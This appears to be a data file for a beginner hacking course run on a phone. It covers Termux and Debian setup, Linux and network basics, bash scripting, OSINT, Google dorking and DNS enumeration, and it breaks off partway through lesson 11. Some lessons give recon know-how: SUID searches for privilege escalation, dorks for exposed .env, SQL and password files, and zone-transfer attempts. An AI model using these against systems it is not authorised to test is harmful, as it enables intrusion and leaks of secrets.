/* ================================================================
   NIGHTERS CYBER ACADEMY — lessons-data.js
   All 30 Lessons — 50% Web / 50% System
   ================================================================ */
const LESSONS=[
{id:1,title:"Setting Up Your Arsenal",emoji:"📱",subtitle:"Install Termux and Debian. Get ready for everything.",type:"system",phase:1,month:1,points:50,duration_mins:60,
intro:"Before anything, we need our tools ready. This level sets up Termux and Debian on your phone. If you skip this, nothing else works.",
sections:[
{title:"Install Termux from F-Droid",steps:["Go to f-droid.org on your phone browser","Download and install F-Droid","Open F-Droid and search: Termux","Install Termux from F-Droid (NOT Play Store)","Open Termux and tap Allow for storage"],
cmd:[{t:"c",v:"First command after opening Termux"},{t:"cmd",v:"pkg update && pkg upgrade -y"},{t:"ok",v:"All packages up to date."}],warning:"Never use Termux from Play Store. It is old and broken."},
{title:"Install Debian",steps:["Install proot-distro","Install Debian","Login to Debian","Update Debian"],
cmd:[{t:"cmd",v:"pkg install proot-distro -y"},{t:"ok",v:"proot-distro installed."},{t:"cmd",v:"proot-distro install debian"},{t:"out",v:"Downloading Debian... (5-10 minutes)"},{t:"cmd",v:"proot-distro login debian"},{t:"p",v:"root@localhost:~#"},{t:"cmd",v:"apt update && apt upgrade -y"},{t:"ok",v:"Done."}]},
{title:"Install Month 1 Tools",steps:["Run the install command below","Wait for it to finish","Verify with which command"],
cmd:[{t:"cmd",v:"apt install -y curl wget git nmap whois dnsutils net-tools python3 python3-pip"},{t:"ok",v:"All tools installed."},{t:"cmd",v:"which nmap curl wget git python3"},{t:"out",v:"/usr/bin/nmap\n/usr/bin/curl\n/usr/bin/wget\n/usr/bin/git\n/usr/bin/python3"}],warning:"Do NOT install Metasploit or PostgreSQL. Too heavy for phone."},
{title:"Create a Debian Shortcut",steps:["Exit Debian to Termux","Create a shortcut file","Test it"],
cmd:[{t:"cmd",v:"exit"},{t:"cmd",v:"echo 'proot-distro login debian' > ~/deb.sh && chmod +x ~/deb.sh"},{t:"cmd",v:"bash ~/deb.sh"},{t:"p",v:"root@localhost:~#"},{t:"ok",v:"You are in Debian. Type exit to go back."}]}
],
troubleshoot:[{prob:"pkg update fails",fix:"Make sure WiFi is on. Try again."},{prob:"Not enough space",fix:"Free 2GB on phone first."},{prob:"Download stops",fix:"Run proot-distro install debian again."}],
hints:["Type exit to leave Debian and go back to Termux","If Termux closes, just open it again and run: bash ~/deb.sh"],
quiz:[{q:"Where do you download Termux from?",opts:["Play Store","GitHub","F-Droid","Samsung Store"],a:2},{q:"What command installs Debian?",opts:["apt install debian","pkg install debian","proot-distro install debian","install debian"],a:2},{q:"How do you enter Debian?",opts:["debian login","proot-distro login debian","ssh debian","sudo debian"],a:1},{q:"Which tool is too heavy for phone?",opts:["nmap","curl","Metasploit","wget"],a:2},{q:"What does apt update do?",opts:["Installs tools","Updates packages list","Deletes old files","Reboots system"],a:1}],
assignment:{title:"Prove Your Setup Works",tasks:["Run: uname -a","Run: which nmap","Run: python3 --version","Run: whoami"],submit:"Screenshot of all 4 commands inside Debian"}},

{id:2,title:"Moving Around Linux",emoji:"🧭",subtitle:"Navigate the file system like you own it.",type:"system",phase:1,month:1,points:50,duration_mins:55,
intro:"Everything in Linux is done with commands. Learn to move around, create files, and find things. This is the foundation of everything else.",
sections:[
{title:"Where Are You (pwd, ls, cd)",steps:["pwd shows where you are","ls shows what is here","cd moves you somewhere"],
cmd:[{t:"cmd",v:"pwd"},{t:"out",v:"/root"},{t:"cmd",v:"ls -la"},{t:"out",v:"total 28\ndrwx------ root root .bashrc"},{t:"cmd",v:"cd /tmp && pwd"},{t:"out",v:"/tmp"},{t:"cmd",v:"cd ~ && pwd"},{t:"out",v:"/root"}]},
{title:"Create Files and Folders",steps:["mkdir makes folders","touch makes empty files","echo writes text into a file"],
cmd:[{t:"cmd",v:"mkdir nighters && cd nighters"},{t:"cmd",v:"touch notes.txt"},{t:"cmd",v:"echo 'Level 2 - Linux basics' > notes.txt"},{t:"cmd",v:"cat notes.txt"},{t:"out",v:"Level 2 - Linux basics"},{t:"cmd",v:"echo 'More notes' >> notes.txt"},{t:"cmd",v:"cat notes.txt"},{t:"out",v:"Level 2 - Linux basics\nMore notes"}]},
{title:"Copy, Move, Delete",steps:["cp copies files","mv renames or moves","rm deletes permanently"],
cmd:[{t:"cmd",v:"cp notes.txt backup.txt"},{t:"cmd",v:"ls"},{t:"out",v:"backup.txt  notes.txt"},{t:"cmd",v:"mv backup.txt old.txt"},{t:"cmd",v:"rm old.txt"},{t:"cmd",v:"ls"},{t:"out",v:"notes.txt"}],warning:"rm deletes permanently. No recycle bin. No undo."},
{title:"Find Files",steps:["which finds where a tool is","find searches for files","grep searches inside files"],
cmd:[{t:"cmd",v:"which nmap"},{t:"out",v:"/usr/bin/nmap"},{t:"cmd",v:"find /root -name '*.txt'"},{t:"out",v:"/root/nighters/notes.txt"},{t:"cmd",v:"grep 'Level' notes.txt"},{t:"out",v:"Level 2 - Linux basics"}]}
],
hints:["Press Tab to auto-complete file names","cd .. goes up one folder","cd ~ takes you to /root"],
quiz:[{q:"What command shows your current folder?",opts:["ls","where","pwd","cd"],a:2},{q:"What does >> do?",opts:["Overwrites file","Adds to end of file","Creates new file","Deletes file"],a:1},{q:"How do you go to home folder?",opts:["cd home","cd /home","cd ~","cd root"],a:2},{q:"What is dangerous about rm -rf?",opts:["It is slow","Deletes permanently with no undo","Needs root","Only deletes empty folders"],a:1},{q:"What finds where nmap is stored?",opts:["find nmap","locate nmap","which nmap","where nmap"],a:2}],
assignment:{title:"File System Task",tasks:["Create folder /root/mission1","Inside it create: target.txt, notes.txt, report.txt","Write your name inside target.txt","Copy target.txt to target-backup.txt","Run: ls -la inside mission1"],submit:"Screenshot of ls -la showing all files"}},

{id:3,title:"File Permissions",emoji:"🔐",subtitle:"Control who can read, write, and run files.",type:"system",phase:1,month:1,points:50,duration_mins:55,
intro:"Every file has permissions. This controls who can read, change, or run it. Weak permissions are one of the most common ways attackers get deeper into a system.",
sections:[
{title:"Reading Permissions",steps:["ls -la shows permissions","The format is: type + owner + group + others","r=read w=write x=execute"],
cmd:[{t:"cmd",v:"ls -la"},{t:"out",v:"-rwxr-xr-- 1 malik root 1234 notes.txt"},{t:"c",v:"- = file (d = directory)"},{t:"c",v:"rwx = owner: read write execute"},{t:"c",v:"r-x = group: read execute"},{t:"c",v:"r-- = others: read only"}]},
{title:"Change Permissions (chmod)",steps:["chmod changes permissions","Use numbers: 777, 755, 644, 600","Or use letters: +x, -w, u+r"],
cmd:[{t:"cmd",v:"chmod +x script.sh"},{t:"cmd",v:"chmod 600 private.txt"},{t:"cmd",v:"chmod 755 program"},{t:"c",v:"7 = rwx (4+2+1)"},{t:"c",v:"6 = rw- (4+2)"},{t:"c",v:"5 = r-x (4+1)"},{t:"c",v:"4 = r-- (4)"},{t:"c",v:"600 = owner rw only"},{t:"c",v:"755 = owner all, others read+execute"},{t:"c",v:"777 = everyone everything (DANGEROUS)"}]},
{title:"Users and Passwords",steps:["whoami shows your user","adduser creates new user","passwd changes password","su switches user"],
cmd:[{t:"cmd",v:"whoami"},{t:"out",v:"root"},{t:"cmd",v:"adduser malik"},{t:"out",v:"Adding user malik...\nEnter new UNIX password:"},{t:"cmd",v:"passwd malik"},{t:"out",v:"New password:\npasswd: password updated successfully"},{t:"cmd",v:"su - malik"},{t:"p",v:"malik@localhost:~$"},{t:"cmd",v:"exit"}]},
{title:"Why Permissions Matter for Hacking",steps:["Find SUID files (run as owner)","Find world-writable files","These are privesc targets"],
cmd:[{t:"cmd",v:"find / -perm -4000 -type f 2>/dev/null"},{t:"out",v:"/usr/bin/passwd\n/usr/bin/sudo"},{t:"cmd",v:"find / -perm -0002 -type f 2>/dev/null"},{t:"c",v:"World-writable files are security risks"}]}
],
hints:["7=rwx 6=rw- 5=r-x 4=r-- — memorize this","chmod 600 = private file only you can read/write"],
quiz:[{q:"What does chmod 600 do?",opts:["Owner read write only","Everyone read","Owner execute","No access"],a:0},{q:"What does SUID bit do?",opts:["Makes file hidden","File runs as its owner","Encrypts file","Deletes on run"],a:1},{q:"What number means full permissions for everyone?",opts:["644","755","777","600"],a:2},{q:"Which command changes file owner?",opts:["chmod","chown","chperm","setowner"],a:1},{q:"What does ls -la show?",opts:["Only files","Files with permissions and hidden files","Only folders","Running processes"],a:1}],
assignment:{title:"Permissions Challenge",tasks:["Create secret.txt with text: This is private","Set permissions to 600","Create hello.sh that prints: Hello Nighters","Make it executable and run it","Show ls -la for both files"],submit:"Screenshot of both files with correct permissions and script output"}},

{id:4,title:"Networking Basics",emoji:"🌐",subtitle:"Understand IPs, DNS, ports, TCP, and UDP.",type:"system",phase:1,month:1,points:50,duration_mins:60,
intro:"You cannot hack a network you do not understand. This level is theory plus practical. Every level after this uses this knowledge.",
sections:[
{title:"IP Addresses",steps:["Every device has an IP","Private IPs are local only","Public IP is what internet sees"],
cmd:[{t:"cmd",v:"ip addr show"},{t:"out",v:"inet 192.168.1.5/24 (private)"},{t:"cmd",v:"curl ifconfig.me"},{t:"out",v:"102.45.67.89 (public)"},{t:"c",v:"Private ranges: 10.x.x.x, 172.16-31.x.x, 192.168.x.x"}]},
{title:"DNS",steps:["DNS converts names to IPs","nslookup and dig query DNS","Different record types: A, MX, NS, TXT"],
cmd:[{t:"cmd",v:"nslookup google.com"},{t:"out",v:"Name: google.com\nAddress: 142.250.80.46"},{t:"cmd",v:"dig google.com MX"},{t:"out",v:"google.com. MX 10 smtp.google.com."},{t:"cmd",v:"dig google.com NS"},{t:"out",v:"google.com. NS ns1.google.com."}]},
{title:"Ports",steps:["Ports are like doors on a computer","Each service uses a specific port","Know the common ones"],
cmd:[{t:"c",v:"Port 21  = FTP"},{t:"c",v:"Port 22  = SSH"},{t:"c",v:"Port 23  = Telnet"},{t:"c",v:"Port 25  = SMTP (email)"},{t:"c",v:"Port 53  = DNS"},{t:"c",v:"Port 80  = HTTP"},{t:"c",v:"Port 443 = HTTPS"},{t:"c",v:"Port 3306= MySQL"},{t:"cmd",v:"ss -tuln"},{t:"out",v:"tcp LISTEN 0.0.0.0:22"}]},
{title:"TCP vs UDP",steps:["TCP = reliable, confirms delivery","UDP = fast, no confirmation","Know which protocols use which"],
cmd:[{t:"c",v:"TCP: HTTP, SSH, FTP, email — reliable"},{t:"c",v:"UDP: DNS, video, gaming — fast"},{t:"cmd",v:"curl -v http://example.com 2>&1 | head -10"},{t:"out",v:"Trying 93.184.216.34:80...\nConnected to example.com port 80"}]}
],
hints:["To remember ports: 22=SSH, 80=HTTP, 443=HTTPS, 3306=MySQL","Your local IP is 192.168.x.x, public IP use: curl ifconfig.me"],
quiz:[{q:"Default port for HTTPS?",opts:["80","8080","443","22"],a:2},{q:"What does DNS do?",opts:["Encrypts traffic","Converts domain names to IPs","Sends emails","Manages passwords"],a:1},{q:"Which is a private IP?",opts:["8.8.8.8","142.250.80.46","192.168.1.1","172.217.0.1"],a:2},{q:"TCP is used for?",opts:["Fast streaming","DNS","Reliable connections like HTTP","Gaming only"],a:2},{q:"What shows open ports on your machine?",opts:["myip","ifconfig","ss -tuln","show ip"],a:2}],
assignment:{title:"Network Recon on Yourself",tasks:["Find private IP: ip addr show","Find public IP: curl ifconfig.me","Look up IP of facebook.com: nslookup","Find MX records of gmail.com: dig gmail.com MX","List open ports: ss -tuln"],submit:"Screenshot of all 5 commands and results"}},

{id:5,title:"Network Tools",emoji:"📡",subtitle:"ping, traceroute, dig, nslookup, ss — use them all.",type:"system",phase:1,month:1,points:50,duration_mins:60,
intro:"These tools are used every day. Before any attack, you check if the target is alive, where it is, and what it runs.",
sections:[
{title:"ping",steps:["ping checks if a host is alive","Use -c to limit packets","No reply = down or blocking"],
cmd:[{t:"cmd",v:"ping -c 4 google.com"},{t:"out",v:"64 bytes from 142.250.80.46: time=12.4ms\n4 packets transmitted, 4 received, 0% loss"},{t:"cmd",v:"ping -c 3 8.8.8.8"},{t:"c",v:"Request timeout = not responding"},{t:"c",v:"Network unreachable = your internet is down"}]},
{title:"traceroute",steps:["traceroute shows every router your packet passes through","Counts hops to target","* means hop is blocked (normal)"],
cmd:[{t:"cmd",v:"apt install -y traceroute"},{t:"cmd",v:"traceroute google.com"},{t:"out",v:"1  192.168.1.1   1.2ms\n2  10.0.0.1      8.1ms\n3  * * *\n4  142.250.80.46 12.4ms"}]},
{title:"dig and nslookup",steps:["dig gives detailed DNS output","nslookup is simpler","Use @8.8.8.8 to use specific DNS server"],
cmd:[{t:"cmd",v:"dig example.com"},{t:"out",v:"example.com. 86400 IN A 93.184.216.34"},{t:"cmd",v:"dig @8.8.8.8 example.com"},{t:"cmd",v:"dig -x 8.8.8.8"},{t:"out",v:"dns.google."},{t:"cmd",v:"nslookup example.com"},{t:"out",v:"Name: example.com\nAddress: 93.184.216.34"}]},
{title:"netstat and ss",steps:["ss shows open ports and connections","Use -tuln for listening ports","Use -tun for active connections"],
cmd:[{t:"cmd",v:"ss -tuln"},{t:"out",v:"tcp LISTEN 0.0.0.0:22"},{t:"cmd",v:"ss -tun"},{t:"c",v:"These show what is open on YOUR machine"},{t:"c",v:"Nmap shows what is open on TARGET machines"}]}
],
hints:["ping -c 4 stops after 4 packets. Without -c it runs forever. Press Ctrl+C to stop.","dig +short domain.com gives just the IP with no extra info"],
quiz:[{q:"What does ping do?",opts:["Scans ports","Tests if host is reachable","DNS query","Downloads page"],a:1},{q:"What does * * * mean in traceroute?",opts:["Host is down","Hop blocked the probe","Internet down","Packet lost"],a:1},{q:"What DNS record gives IP?",opts:["MX","NS","TXT","A"],a:3},{q:"ss -tuln shows?",opts:["Running processes","Listening ports on your machine","DNS records","WiFi networks"],a:1},{q:"What flag stops ping after 4 packets?",opts:["-s 4","-n 4","-c 4","-t 4"],a:2}],
assignment:{title:"Network Recon Task",tasks:["Ping 3 websites with -c 4","Run traceroute on one site, count hops","Find A and MX records of any site using dig","Run ss -tuln and write down what is listening"],submit:"Screenshot of all commands with full output"}},

{id:6,title:"Bash Scripting",emoji:"📜",subtitle:"Write scripts that do the work for you.",type:"system",phase:1,month:1,points:50,duration_mins:65,
intro:"Instead of typing 10 commands every time, write a script and run it once. For hackers, scripts save time during recon and scanning.",
sections:[
{title:"Your First Script",steps:["Start with #!/bin/bash","Save as .sh file","chmod +x to make executable","Run with ./script.sh"],
cmd:[{t:"cmd",v:"nano hello.sh"},{t:"out",v:"#!/bin/bash\necho 'Hello from Nighters!'\necho 'User:' && whoami\necho 'Date:' && date"},{t:"c",v:"Save: Ctrl+X then Y then Enter"},{t:"cmd",v:"chmod +x hello.sh && ./hello.sh"},{t:"out",v:"Hello from Nighters!\nUser: root\nDate: Wed Jun 25 2025"}]},
{title:"Variables and User Input",steps:["Variables store values","read -p asks user to type something","Use $VARIABLE to access the value"],
cmd:[{t:"out",v:"#!/bin/bash\nTARGET='google.com'\necho \"Checking: $TARGET\"\nping -c 2 $TARGET\nread -p 'Enter a domain: ' DOMAIN\nnslookup $DOMAIN"},{t:"cmd",v:"chmod +x vars.sh && ./vars.sh"},{t:"out",v:"Checking: google.com\n[ping output]\nEnter a domain: example.com\n[nslookup output]"}]},
{title:"If/Else Logic",steps:["if checks a condition","else runs if condition is false","fi closes the if block"],
cmd:[{t:"out",v:"#!/bin/bash\nread -p 'Enter host: ' HOST\nif ping -c 1 $HOST &> /dev/null; then\n  echo \"$HOST is UP\"\nelse\n  echo \"$HOST is DOWN\"\nfi"},{t:"cmd",v:"./check.sh"},{t:"out",v:"Enter host: google.com\ngoogle.com is UP"}]},
{title:"Loops",steps:["for loop runs commands for each item in a list","Very useful for checking multiple targets"],
cmd:[{t:"out",v:"#!/bin/bash\nfor TARGET in google.com github.com example.com; do\n  if ping -c 1 $TARGET &>/dev/null; then\n    echo \"ONLINE: $TARGET\"\n  else\n    echo \"OFFLINE: $TARGET\"\n  fi\ndone"},{t:"cmd",v:"./scan.sh"},{t:"out",v:"ONLINE: google.com\nONLINE: github.com\nONLINE: example.com"}]}
],
hints:["If script gives bad interpreter error: check line 1 is exactly #!/bin/bash","Save output to file: ./script.sh > output.txt"],
quiz:[{q:"What does #!/bin/bash do?",opts:["It is a comment","Tells system to use bash","Sets permissions","Imports tools"],a:1},{q:"How do you make a script executable?",opts:["bash +x script.sh","chmod +x script.sh","run script.sh","exec script.sh"],a:1},{q:"What does read -p do?",opts:["Reads a file","Prints variable","Asks user to type something","Loops through list"],a:2},{q:"How do you run a script?",opts:["open script.sh","./script.sh","start script.sh","execute script.sh"],a:1},{q:"$TARGET in bash means?",opts:["File named TARGET","Value stored in TARGET variable","Command called TARGET","Network target"],a:1}],
assignment:{title:"Build a Recon Script",tasks:["Write recon.sh","Ask user for a domain","Run: ping -c 3, nslookup, dig on the domain","Save all output to report.txt","Test it on 3 different domains"],submit:"Your recon.sh script code + screenshot running it"}},

{id:7,title:"Installing and Managing Tools",emoji:"🔧",subtitle:"Install only what you need. Keep your phone fast.",type:"system",phase:1,month:1,points:50,duration_mins:50,
intro:"The biggest mistake beginners make is installing every tool they see. This slows the phone. Install only what you will actually use.",
sections:[
{title:"apt Package Manager",steps:["apt update refreshes package list","apt install installs tools","apt remove uninstalls","apt purge removes completely"],
cmd:[{t:"cmd",v:"apt update"},{t:"cmd",v:"apt install -y nikto"},{t:"cmd",v:"apt remove nikto"},{t:"cmd",v:"apt purge nikto && apt autoremove"},{t:"cmd",v:"dpkg -l | grep nmap"}]},
{title:"pip for Python Tools",steps:["pip3 installs Python packages","Use pip3 not pip","Check with pip3 show"],
cmd:[{t:"cmd",v:"pip3 install sublist3r"},{t:"out",v:"Collecting sublist3r\nInstalled sublist3r-1.1"},{t:"cmd",v:"sublist3r -d google.com"},{t:"cmd",v:"pip3 show sublist3r"}]},
{title:"git clone for GitHub Tools",steps:["git clone downloads a tool from GitHub","cd into the folder","Install requirements.txt if it exists"],
cmd:[{t:"cmd",v:"git clone https://github.com/aboul3la/Sublist3r.git"},{t:"cmd",v:"cd Sublist3r"},{t:"cmd",v:"pip3 install -r requirements.txt"},{t:"cmd",v:"python3 sublist3r.py -d example.com"}]},
{title:"Full Month 1 Tool Install",steps:["Run this one command","It installs everything you need for Month 1","Verify with which command"],
cmd:[{t:"cmd",v:"apt install -y nmap curl wget git whois dnsutils dirb gobuster nikto hydra netcat-openbsd theharvester dnsrecon"},{t:"ok",v:"All tools installed."},{t:"cmd",v:"which nmap gobuster nikto dirb hydra nc"},{t:"c",v:"DO NOT install: metasploit postgresql armitage beef"}]}
],
hints:["Always run apt update before apt install to fix 90% of install errors","which toolname checks if it is installed. No output = not installed."],
quiz:[{q:"What installs tools in Debian?",opts:["pkg install","yum install","apt install","brew install"],a:2},{q:"How do you install a Python tool?",opts:["apt install","pip3 install","python install","download"],a:1},{q:"What is git clone used for?",opts:["Copy local files","Download tool from GitHub","Install apt packages","Clone user"],a:1},{q:"Which tool should NOT be installed on phone?",opts:["nmap","curl","Metasploit","whois"],a:2},{q:"How do you clean remove a tool?",opts:["apt remove","apt purge tool && apt autoremove","rm tool","delete tool"],a:1}],
assignment:{title:"Tool Setup Verification",tasks:["Run the full Month 1 install command","Run: which nmap gobuster nikto dirb","Run: pip3 show sublist3r","Check disk space: df -h"],submit:"Screenshot showing all tools installed and disk space"}},

{id:8,title:"How the Web Works",emoji:"🌍",subtitle:"HTTP, HTTPS, requests and responses.",type:"web",phase:1,month:1,points:50,duration_mins:60,
intro:"Before hacking websites, understand how they work. Every web vulnerability is about manipulating the communication between browser and server.",
sections:[
{title:"What Happens When You Visit a Website",steps:["Browser asks DNS for IP","DNS replies with IP","Browser connects on port 80 or 443","Browser sends GET request","Server sends back HTML/CSS/JS"],
cmd:[{t:"cmd",v:"curl -v http://example.com 2>&1 | head -30"},{t:"out",v:"Trying 93.184.216.34:80...\nConnected!\nGET / HTTP/1.1\nHost: example.com\nHTTP/1.1 200 OK\nContent-Type: text/html"}]},
{title:"HTTP Methods",steps:["GET = retrieve something","POST = send data","HEAD = get headers only","PUT = update, DELETE = delete"],
cmd:[{t:"cmd",v:"curl https://example.com"},{t:"cmd",v:"curl -X POST -d 'user=malik&pass=test' http://example.com/login"},{t:"cmd",v:"curl -I https://example.com"},{t:"out",v:"HTTP/2 200\ncontent-type: text/html\nserver: ECS (nyb/1D2E)"}]},
{title:"HTTP Status Codes",steps:["200 = OK","301/302 = Redirect","401 = Unauthorized","403 = Forbidden","404 = Not Found","500 = Server Error"],
cmd:[{t:"cmd",v:"curl -o /dev/null -s -w '%{http_code}' https://google.com"},{t:"out",v:"200"},{t:"cmd",v:"curl -o /dev/null -s -w '%{http_code}' https://google.com/fakepage"},{t:"out",v:"404"}]},
{title:"Reading HTTP Headers",steps:["Headers reveal server info","Missing headers = vulnerabilities","Server: reveals web server type","X-Powered-By: reveals backend"],
cmd:[{t:"cmd",v:"curl -I https://github.com"},{t:"out",v:"HTTP/2 200\nserver: GitHub.com\nx-content-type-options: nosniff\nx-frame-options: deny"},{t:"c",v:"server: apache/2.4 → old version, check CVEs"},{t:"c",v:"X-Powered-By: PHP/7.4 → backend language revealed"}]}
],
hints:["curl -v shows everything (verbose). Use when you want to see full request/response.","The server header reveals software. Old versions may have known vulnerabilities."],
quiz:[{q:"What HTTP method submits a login form?",opts:["GET","PUT","POST","HEAD"],a:2},{q:"Status code for Not Found?",opts:["200","403","404","500"],a:2},{q:"What header reveals web server type?",opts:["Content-Type","Server","Cookie","Host"],a:1},{q:"HTTP 403 means?",opts:["Not found","Success","Access forbidden","Server error"],a:2},{q:"curl flag that shows all headers?",opts:["-h","-v","-i","-a"],a:1}],
assignment:{title:"Web Request Analysis",tasks:["curl -v http://httpbin.org/get","curl -I on 3 different websites","Find server header for each","Send POST: curl -X POST https://httpbin.org/post -d test=nighters","Check status code of a 404 page"],submit:"Screenshot of curl commands and notes on headers found"}},

{id:9,title:"OSINT — Finding Public Info",emoji:"🔍",subtitle:"What can you find without touching their systems?",type:"web",phase:1,month:1,points:50,duration_mins:65,
intro:"OSINT is gathering information that is already public. No hacking. No illegal access. This is always the first step in any real engagement. Good recon makes everything easier.",
sections:[
{title:"What is OSINT",steps:["OSINT = Open Source Intelligence","All from public sources","Completely legal","Types: emails, IPs, subdomains, tech stack, employees"],
cmd:[{t:"c",v:"What you can find legally:"},{t:"c",v:"Employee names and emails"},{t:"c",v:"Technologies the site uses"},{t:"c",v:"Domain registration details"},{t:"c",v:"IP addresses and hosting info"},{t:"c",v:"Subdomains and old pages"}]},
{title:"whois and theHarvester",steps:["whois finds domain registration info","theHarvester finds emails, subdomains, hosts"],
cmd:[{t:"cmd",v:"whois example.com"},{t:"out",v:"Registrar: IANA\nCreation Date: 1995-08-14\nName Server: A.IANA-SERVERS.NET"},{t:"cmd",v:"theHarvester -d example.com -b bing"},{t:"out",v:"[*] Emails found: admin@example.com\n[*] Hosts found: www.example.com"}]},
{title:"Finding Emails",steps:["theHarvester finds emails from public sources","hunter.io finds company email formats","LinkedIn shows employees"],
cmd:[{t:"cmd",v:"theHarvester -d company.com -b google"},{t:"c",v:"Also check: https://hunter.io"},{t:"c",v:"Search Google: site:linkedin.com company name engineer"},{t:"c",v:"Once you know email format: first.last@company.com"},{t:"c",v:"You can guess other emails using same pattern"}]},
{title:"Shodan",steps:["Shodan finds internet-connected devices","Search without touching target","Reveals open ports, services, locations"],
cmd:[{t:"c",v:"Website: https://shodan.io"},{t:"c",v:"Search examples:"},{t:"c",v:"country:NG port:80 (web servers in Nigeria)"},{t:"c",v:"apache 2.2 port:80 (old Apache servers)"},{t:"c",v:"default password (devices with default creds)"},{t:"c",v:"product:nginx (nginx servers)"}]}
],
hints:["web.archive.org shows old versions of websites. Old pages often have exposed files.","theHarvester -b all searches many sources. Use -b google for speed."],
quiz:[{q:"OSINT stands for?",opts:["Open System Intelligence","Open Source Intelligence","Online Security Investigation","Offensive Security Insight"],a:1},{q:"Is OSINT legal?",opts:["Never","Always illegal","Legal when gathering public info","Only with permission"],a:2},{q:"whois tells you?",opts:["Open ports","Domain registration info","Email contents","Vulnerabilities"],a:1},{q:"Shodan is used for?",opts:["Scanning domains","Finding internet-connected devices","Cracking passwords","Finding emails"],a:1},{q:"Wayback Machine shows?",opts:["Weather history","Old versions of websites","Email archives","Source code"],a:1}],
assignment:{title:"OSINT Profile",tasks:["Pick a known tech company (not government)","Run whois on their domain","Run theHarvester to find subdomains/emails","Check shodan.io for the domain","Write: what you found and what it means"],submit:"Written profile with all findings"}},

{id:10,title:"Google Dorking",emoji:"🔎",subtitle:"Use Google to find what hackers look for.",type:"web",phase:1,month:1,points:50,duration_mins:50,
intro:"Google dorking uses special search operators to find information that normal searches miss. Completely legal — just smarter searching.",
sections:[
{title:"Search Operators",steps:["site: searches on specific domain","filetype: finds specific file types","intitle: searches page titles","inurl: searches URLs","intext: searches page content"],
cmd:[{t:"c",v:"site:company.com — search only this domain"},{t:"c",v:"filetype:pdf — find PDFs only"},{t:"c",v:"intitle:\"admin\" — pages with admin in title"},{t:"c",v:"inurl:login — pages with login in URL"},{t:"c",v:"\"index of\" — directory listings"},{t:"c",v:"site:company.com filetype:pdf"},{t:"c",v:"site:company.com inurl:admin intitle:login"}]},
{title:"Useful Dorks",steps:["Find exposed config files","Find backup files","Find directory listings","Find login pages"],
cmd:[{t:"c",v:"site:target.com filetype:env"},{t:"c",v:"site:target.com filetype:bak"},{t:"c",v:"site:target.com intitle:\"index of\""},{t:"c",v:"site:target.com inurl:login OR inurl:admin"},{t:"c",v:"site:target.com filetype:sql"},{t:"c",v:"filetype:txt intext:\"password\" site:target.com"}]},
{title:"Find Subdomains with Google",steps:["Google indexes subdomains","Use site: with wildcard","Find dev and staging (less secure)"],
cmd:[{t:"c",v:"site:*.example.com -site:www.example.com"},{t:"c",v:"This shows: mail.example.com, vpn.example.com"},{t:"c",v:"dev. staging. admin. api. are most valuable"},{t:"c",v:"Job postings reveal tech stack:"},{t:"c",v:"site:linkedin.com 'example.com' 'senior engineer'"}]},
{title:"GHDB — Google Hacking Database",steps:["GHDB has thousands of real dorks","Organized by category","Go to: exploit-db.com/google-hacking-database"],
cmd:[{t:"c",v:"Categories:"},{t:"c",v:"Files containing passwords"},{t:"c",v:"Sensitive directories"},{t:"c",v:"Web server detection"},{t:"c",v:"Error messages that reveal info"},{t:"c",v:"Real example: intitle:\"index of\" \"wp-content\""},{t:"c",v:"This finds exposed WordPress folders"}]}
],
hints:["Combine operators: site:example.com filetype:pdf intext:confidential","inurl:/phpmyadmin/ finds exposed database admin panels — many left open"],
quiz:[{q:"filetype: operator does?",opts:["Filters by size","Searches specific file types","Finds FTP files","Downloads files"],a:1},{q:"Dork to find login pages?",opts:["site:login","inurl:login","search:login","find:login"],a:1},{q:"site:*.example.com does?",opts:["Searches main site only","Finds subdomains","Finds all .com sites","Searches inside files"],a:1},{q:"GHDB is?",opts:["Hacking tool","Collection of Google dorks","Government database","Vulnerability scanner"],a:1},{q:"intitle:\"index of\" finds?",opts:["Admin panels","Exposed directory listings","Password files","Login forms"],a:1}],
assignment:{title:"Google Dorking Research",tasks:["Find 3 login pages using dorks","Find an exposed directory using index of dork","Use site:*.domain.com to find subdomains of a big site","Visit GHDB and find 2 interesting dorks","Explain what each dork does in your own words"],submit:"Screenshots of dork results and your explanations"}},

{id:11,title:"Whois and DNS Enumeration",emoji:"📋",subtitle:"Dig deep into DNS records to map a target.",type:"system",phase:2,month:2,points:60,duration_mins:65,
intro:"DNS holds a lot of information companies expose without realizing. Finding all DNS records tells you about servers, email systems, and internal hostnames.",
sections:[
{title:"Whois Deep Dive",steps:["whois gives domain registration details","Look for: registrar, nameservers, email, expiry","Expired domains can be taken over"],
cmd:[{t:"cmd",v:"whois target.com"},{t:"out",v:"Domain Name: TARGET.COM\nRegistrar: GoDaddy\nCreation Date: 2015-03-12\nExpiry Date: 2026-03-12\nName Server: NS1.TARGET.COM\nRegistrant Email: admin@target.com"}]},
{title:"All DNS Record Types",steps:["A = IP address","MX = mail servers","NS = name servers","TXT = verification codes","CNAME = aliases"],
cmd:[{t:"cmd",v:"dig target.com A"},{t:"cmd",v:"dig target.com MX"},{t:"cmd",v:"dig target.com NS"},{t:"cmd",v:"dig target.com TXT"},{t:"cmd",v:"dig target.com ANY"}]},
{title:"DNS Zone Transfer",steps:["Zone transfer gets ALL records at once","Most servers block this — but some do not","If it works, you find internal hostnames"],
cmd:[{t:"cmd",v:"dig target.com NS"},{t:"out",v:"target.com. NS ns1.target.com."},{t:"cmd",v:"dig axfr @ns1.target.com target.com"},{t:"out",v:"; Transfer failed. (Most protected)"},{t:"c",v:"If successful (vulnerable):"},{t:"out",v:"www  A 192.168.1.10\nmail A 192.168.1.20\ndev  A 10.0.0.5"}]},
{title:"dnsrecon",steps:["dnsrecon automates all DNS checks","One command, full output","Can brute-force subdomains too"],
cmd:[{t:"cmd",v:"apt install -y dnsrecon"},{t:"cmd",v:"dnsrecon -d target.com"},{t:"out",v:"[*] A target.com 93.184.216.34\n[*] MX mail.target.com\n[*] NS ns1.target.com"},{t:"cmd",v:"dnsrecon -d target.com -t axfr"}]}
],
hints:["TXT records often contain SPF policy and verification codes — useful for mapping infrastructure","If zone transfer works, save immediately: dig axfr @ns1.target.com target.com > zone.txt"],
quiz:[{q:"DNS A record gives?",opts:["Mail server","IP address","Name server","TXT content"],a:1},{q:"What is a DNS zone transfer?",opts:["Move DNS to new server","Get ALL DNS records","Delete records","Encrypt DNS"],a:1},{q:"Command to attempt zone transfer?",opts:["dig target.com ALL","dig axfr @ns1 target.com","dig transfer","nslookup -zone"],a:1},{q:"MX record tells you?",opts:["IP address","Mail servers","Name servers","Subdomains"],a:1},{q:"dnsrecon automates?",opts:["Port scanning","All DNS checks","Web scanning","Password cracking"],a:1}],
